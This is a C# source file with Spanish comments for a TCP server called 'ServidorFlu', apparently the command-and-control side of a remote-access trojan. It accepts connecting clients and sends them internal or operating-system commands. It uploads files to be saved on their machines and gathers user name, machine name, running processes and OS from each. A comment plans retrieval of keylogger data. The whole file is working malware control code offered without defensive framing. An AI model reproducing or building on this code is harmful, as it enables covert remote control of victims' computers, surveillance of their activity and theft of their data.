using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Net;

namespace Servidor_Sockets
{
    //TODO: Pedir los datos del Keylogger
    //TODO: Implementar un metodo de control para hacer que la transmision pueda ser 
    //interrumpida por el cliente si asi lo desea, o si no necesita mas datos
    //Como obtener la IP: (IPEndPoint)s.RemoteEndPoint).Address.ToString()
    class ServidorFlu
    {
        private List<TcpClient> Clientes;
        private TcpListener Servidor;
        //Avisa al plugin de control que hay un nuveo cliente
        public event EventHandler<ClienteConectado> ClienteConectado;

        public ServidorFlu()
        {
            //TODO: Usar un overload que no este depreciado
            //Hint: http://msdn.microsoft.com/en-us/library/system.net.networkinformation.networkinterface.aspx
            Servidor = new TcpListener(21); Servidor.Start();
            Clientes = new List<TcpClient>();
            (new Thread(new ThreadStart(AceptarConexiones))).Start();
        }

        //Como no hay un delegado para conexiones entrantes toca hacerlo de esta manera
        public void AceptarConexiones()
        {
            while (true)
            {
                //Esta instruccion bloquea el hilo hasta que un nuevo cliente se conecte
                TcpClient Cliente = Servidor.AcceptTcpClient();
                //Añadimos ese cliente a la lista
                Clientes.Add(Cliente);
                //Avisamos al plugin que hay un nuevo cliente
                OnClienteConectado(Cliente);
            }
        }

        /// <summary>
        /// Envia un comando al cliente seleccionado
        /// </summary>
        /// <param name="Cliente">El cliente al cual sera enviado el comando</param>
        /// <param name="Comando">El comando a enviar</param>
        /// <param name="Parametros">Los parametros para ese comando</param>
        /// <param name="Interno">Es el comando interno de Flu o pertenece o al SO en el que esta corriendo?</param>
        /// <returns>El retorno del comando del cliente</returns>
        public String EnviarComando(TcpClient Cliente, String Comando, Boolean Interno, String[] Parametros)
        {
            try
            {
                Byte[] Respuesta = new Byte[20480];
                //Alertar al cliente
                //Condicion ? Se cumple : No se cumple :)
                Cliente.Client.Send(Encoding.ASCII.GetBytes(Interno ? "Comando Interno" : "Comando Externo"));
                //Enviar el comando
                Cliente.Client.Send(Encoding.ASCII.GetBytes(Comando));
                //Enviar todos los parametros
                foreach (String S in Parametros)
                { 
                    Cliente.Client.Send(Encoding.ASCII.GetBytes(S)); Cliente.Client.Receive(Respuesta);
                    //Si el cliente no necesita mas parametros interrumpimos el envio
                    if (Encoding.ASCII.GetString(Respuesta).Equals("Interrumpir")) break;
                }
                //Alertamos al cliente de que se acabaron los parametros
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Fin Comando"));
                //Esto bloquea el hilo hasta que se reciba una respuesta, por tanto se retorna "" si el tiempo limite se excede
                Cliente.Client.Receive(Respuesta);
                return Encoding.ASCII.GetString(Respuesta);
            }
            catch { return ""; }
        }

        /// <summary>
        /// Envia un comando a todos los clientes deseados
        /// </summary>
        /// <param name="Clientes">Un Enumerable (Lista/Arreglo...) que contiene los clientes a los cuales enviar el comando</param>
        /// <param name="Comando">El comando a enviar</param>
        /// <param name="Parametros">Los parametros para ese comando</param>
        /// <param name="Interno">Es el comando interno de Flu o pertenece o al SO en el que esta corriendo?</param>
        /// <returns>Un Enumerable con todos los retornos de los clientes seleccionados</returns>
        public IEnumerator<String> EnviarComando(IEnumerable<TcpClient> Clientes, String Comando, Boolean Interno, String[] Parametros)
        {
            //yield return anade los retornos de cada cliente a una lista implicita creada por el compilador y la devuelve
            foreach (TcpClient Cliente in Clientes) yield return EnviarComando(Cliente, Comando, Interno, Parametros);
        }

        public virtual void OnClienteConectado(TcpClient Cliente)
        {
            //Thread Safety?
            EventHandler<ClienteConectado> Delegado = ClienteConectado;
            if (Delegado != null) 
                Delegado(this, new ClienteConectado(((IPEndPoint)Cliente.Client.RemoteEndPoint).Address, ((IPEndPoint)Cliente.Client.RemoteEndPoint).Port));
        }

        /// <summary>
        /// Envia un archivo a un cliente especifico
        /// </summary>
        /// <param name="Cliente">El cliente objetivo</param>
        /// <param name="Datos">El archivo en forma de bytes</param>
        /// <param name="Nombre">El nombre con el cual se guardara el archivo en el cliente</param>
        /// <returns>El resultado de guardar los archivos en el cliente</returns>
        public Boolean EnviarArchivo(TcpClient Cliente, Byte[] Datos, String Nombre)
        {
            try
            {
                Byte[] Respuesta = new Byte[20480];
                //Enviamos una cabecera para alertar al cliente
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Archivo"));
                //Enviamos el nombre del archivo
                Cliente.Client.Send(Encoding.ASCII.GetBytes(Nombre));
                //Enviamos los datos del archivo
                Cliente.Client.Send(Datos);
                //Esperamos la repsuesta, si no hay alguna en un tiempo, se considera
                //que el cliente fallo en escribir el archivo o recibirlo.
                Cliente.Client.Receive(Respuesta);
                //Si la respuesta es OK entonces el cliente ha completado la descarga
                return Encoding.ASCII.GetString(Respuesta).Equals("OK");
            }
            catch { return false; }
        }

        /// <summary>
        /// Envia el archivo en forma de bytes a los clientes seleccionados
        /// </summary>
        /// <param name="Clientes">Clientes destino</param>
        /// <param name="Datos">El archivo en forma de bytes</param>
        /// <param name="Nombre">El nombre con el cual se guardara el archivo en el cliente</param>
        /// <returns>Una coleccion de los resultados de los clientes</returns>
        public IEnumerable<Boolean> EnviarArchivo(IEnumerable<TcpClient> Clientes, Byte[] Datos, String Nombre)
        {
            //yield return anade los retornos de cada cliente a una lista implicita creada por el compilador y la devuelve
            foreach (TcpClient Cliente in Clientes) yield return EnviarArchivo(Cliente, Datos, Nombre);
        }

        /// <summary>
        /// Obtiene detalles del cliente en cuestion, como la version y los comandos disponibles
        /// </summary>
        /// <param name="Cliente">El cliente objetivo</param>
        /// <returns>Nombre de usuario, Nombre de la maquina, Procesos Abiertos, SO Base, Funciones disponibles</returns>
        public String[] ObtenerDetalles(TcpClient Cliente)
        {
            String[] Retorno = new String[5];
            //Un buffer para la respuesta del cliente
            Byte[] Respuesta = new Byte[2048];
            try
            {
                //Alertar al cliente
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Usuario"));
                //Recibir la respuesta
                Cliente.Client.Receive(Respuesta);
                //Decodificarla
                Retorno[0] = Encoding.ASCII.GetString(Respuesta);
                //Reiniciar el buffer
                Respuesta = new Byte[2048];
                //Lave, enguaje y repita hasta terminar
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Maquina"));
                Cliente.Client.Receive(Respuesta);
                Retorno[1] = Encoding.ASCII.GetString(Respuesta);
                Respuesta = new Byte[2048];
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Procesos"));
                Cliente.Client.Receive(Respuesta);
                Retorno[2] = Encoding.ASCII.GetString(Respuesta);
                Respuesta = new Byte[2048];
                Cliente.Client.Send(Encoding.ASCII.GetBytes("SO"));
                Cliente.Client.Receive(Respuesta);
                Retorno[3] = Encoding.ASCII.GetString(Respuesta);
                Respuesta = new Byte[2048];
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Funciones"));
                Cliente.Client.Receive(Respuesta);
                Retorno[4] = Encoding.ASCII.GetString(Respuesta);
                return Retorno;
            }
            catch { return Retorno; }
        }
    }

    class ClienteConectado : EventArgs
    {
        public readonly IPAddress Direccion;
        public readonly int Puerto;

        public ClienteConectado(IPAddress IP, int Port)
        {
            Direccion = IP;
            Puerto = Port;
        }
    }
}
